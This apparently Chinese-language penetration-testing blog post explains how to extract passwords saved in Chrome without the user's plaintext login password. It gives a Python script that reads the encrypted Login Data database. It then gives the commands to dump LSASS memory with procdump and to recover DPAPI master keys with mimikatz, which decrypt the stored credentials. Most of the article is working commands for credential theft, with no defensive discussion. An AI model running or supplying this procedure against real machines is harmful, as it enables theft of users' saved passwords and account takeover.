---
layout: post
title: 渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码
---


## 0x00 前言
---

在之前的文章[《渗透技巧——离线导出Chrome浏览器中保存的密码》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/)曾得出结论：`使用用户的ntlm hash，无法导出Chrome浏览器保存的明文密码`。

而目前的Windows系统(如Windows Server 2012)，默认无法导出用户的明文口令，只能获得ntlm hash。

也就是说，即使获得了系统的访问权限，如果无法获得明文口令，通过文章[《渗透技巧——离线导出Chrome浏览器中保存的密码》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/)介绍的方法还是无法离线(但可以在线)导出Chrome浏览器保存的明文密码。

本文将要介绍一种新方法，利用Masterkey离线导出Chrome浏览器中保存的密码，不需要获得用户的明文口令，并且得出新的结论。

## 0x01 简介
---

本文将要介绍以下内容：

- 基础概念
- 解密思路
- 导出方法
- 实际测试

## 0x02 基础概念
---

#### DPAPI：

全称Data Protection Application Programming Interface

#### DPAPI blob：

一段密文，可使用Master Key对其解密

#### Master Key：

64字节，用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中

#### Master Key file：

二进制文件，可使用用户登录密码对其解密，获得Master Key


## 0x03 DPAPI解密思路
---

### 1、定位加密的Master Key file

文章[《渗透技巧——离线导出Chrome浏览器中保存的密码》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/)曾得出结论：`无法定位解密Chrome数据库对应的Master Key file`

该结论有误，实际上能够对其定位，方法见0x04

### 2、从lsass进程提取出Master Key

此处换了一种思路，因此不需要用户的明文口令

**注：**

离线从Master Key file提取出Master Key，必须要获得用户的明文口令

### 3、使用Master Key解密DPAPI blob，获得明文


## 0x04 实现方法
---

测试系统：

Win7 x86

### 1、使用python读取数据库文件并提取出密文

使用python脚本读取Login Data并保存到文件中，代码如下：

```
from os import getenv
import sqlite3
import binascii
conn = sqlite3.connect("Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    print (binascii.b2a_hex(result[2]))
    f = open('test.txt', 'wb')
    f.write(result[2])
    f.close()
```

脚本执行后，提取Login Data中保存的密文，保存为test.txt

### 2、获得该密文对应的Master Key file

mimikatz命令如下：

```
dpapi::blob /in:test.txt
```

获得对应guidMasterkey为`{a111b0f6-b4d7-40c8-b536-672a8288b958}`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-1.png)

即Master Key file的路径为`%APPDATA%\Microsoft\Protect\%SID%\a111b0f6-b4d7-40c8-b536-672a8288b958`


### 3、从lsass进程提取出Master Key

#### (1) 在线方式

需要管理员权限

mimikatz:

```
privilege::debug
sekurlsa::dpapi
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-2.png)

提取出Master Key为`666638cbaea3b7cf1dc55688f939e50ea1002cded954a1d17d5fe0fbc90b7dd34677ac148af1f32caf828fdf7234bafbe14b39791b3d7e587176576d39c3fa70`

#### (2) 离线方式

使用procdump dump出LSASS进程内存

procdump下载地址：

https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump

管理员权限：

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

使用mimikatz加载dmp文件：

```
sekurlsa::minidump lsass.dmp
sekurlsa::dpapi
```

**注：**

mimikatz从lsass进程提取出Master Key后，会自动将Master Key加入系统缓存

### 4、使用masterkey解密

mimikatz:

```
dpapi::blob /in:test.txt
```

成功获得明文，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-3.png)

数据正确，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-4.png)

## 0x05 利用分析
---

本文介绍的方法是利用lsass进程还原出Master Key，因此不需要获取到用户的明文密码

同时，配合procdump，不需要在测试系统上执行mimikatz，只需要获得目标系统的两个文件：lsass进程的dmp文件和Login Data文件，在本地使用mimikatz还原出Master Key，解密获得明文

并且，不需要从System权限降权到当前用户权限

综上，离线导出的完整思路如下：

#### 1、获得用户系统Chrome保存密码的SQLite数据库文件，位于`%LocalAppData%\Google\Chrome\User Data\Default\Login Data`

#### 2、获得lsass进程的内存文件

#### 3、在本地使用mimikatz提取Master Key，解密Login Data获得明文

## 0x06 最终结论
---

### 1、能够定位Master Key file

方法1:

mimikatz命令：

```
dpapi::blob /in:test.txt
```

方法2：

通过读取文件Preferred的前16字节获得对应的Master Key file

### 2、不需要用户明文口令也能离线导出Chrome浏览器中保存的密码


## 0x07 小结
---

本文介绍了如何利用Masterkey离线导出Chrome浏览器中保存的密码，相比于之前的方法，更加通用



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



